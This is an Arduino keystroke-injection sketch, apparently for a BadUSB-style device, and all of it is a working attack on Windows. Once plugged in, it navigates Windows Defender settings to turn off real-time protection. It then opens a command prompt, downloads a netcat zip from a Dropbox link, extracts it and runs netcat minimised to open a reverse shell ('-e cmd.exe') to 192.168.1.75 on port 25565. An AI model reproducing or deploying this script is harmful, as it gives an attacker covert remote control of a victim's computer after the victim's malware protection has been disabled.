#include "Keyboard.h"

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  // put your setup code here, to run once:

  // Serial.begin(9600);

  // while(!Serial);
  delay(400);

  // start the magic
  Keyboard.begin();

  delay(400);

  // disable real time protection

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("windowsdefender:");
  typeKey(KEY_RETURN);
  delay(1500);

  typeKey(KEY_RETURN);
  delay(100);

  for (int i = 0; i < 5; i++) {
    typeKey(KEY_TAB);
    delay(50);
  }

  delay(50);

  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print(" ");
  delay(750);
  
  typeKey(KEY_LEFT_ARROW);
  delay(100);
  
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(100);

  // open cmd and get freaky

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("cmd");
  typeKey(KEY_RETURN);
  delay(150);

  Keyboard.print("cd Downloads");
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("start https://www.dropbox.com/scl/fi/usdj9ro86f1ewzm0re2y0/nc64zip.zip?rlkey=dobuary06vlkoylhwtyli5llh\"&\"st=ld0z7ozs\"&\"dl=1");
  delay(100);
  typeKey(KEY_RETURN);

  // file download takes some time
  delay(2000);

  // alt f4 and get back to cmd
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.print("tar -xf nc64zip.zip");
  delay(100);
  typeKey(KEY_RETURN);

  Keyboard.print("tar -xf nc64.zip");
  delay(100);
  typeKey(KEY_RETURN);

  Keyboard.print("START /MIN nc64.exe 192.168.1.75 25565 -e cmd.exe -d & exit");
  delay(100);
  typeKey(KEY_RETURN);

  // end the magic
  Keyboard.end();
}

void loop() {
  // empty loop xd
}
